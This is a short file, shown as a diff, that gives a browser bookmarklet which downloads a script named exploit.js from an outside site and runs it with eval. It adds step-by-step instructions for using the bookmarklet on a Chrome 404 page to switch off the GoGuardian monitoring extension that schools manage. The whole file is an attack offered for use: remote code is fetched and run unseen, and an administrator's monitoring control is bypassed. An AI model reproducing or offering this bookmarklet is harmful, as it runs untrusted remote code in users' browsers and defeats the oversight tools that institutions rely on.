@@ -1,0 +1,6 @@
+javascript:fetch("https://compactcow.com/ltbeef/exploit.js").then(data=>{data.text().then(text=>{eval(text)})});
+
+Doing this is very simple, copy the script, paste it into a bookmark but don't use the bookmark yet.
+In the adress bar paste the script in, you should now be on a 404 error page, that's good! On the error page, you now use the bookmark.
+There should be a small list of extensions on your google chrome with a blue switch to the left of each, click the one next to GoGuardian so it turns grey.
+GoGuardian is now disabled, congratulations!
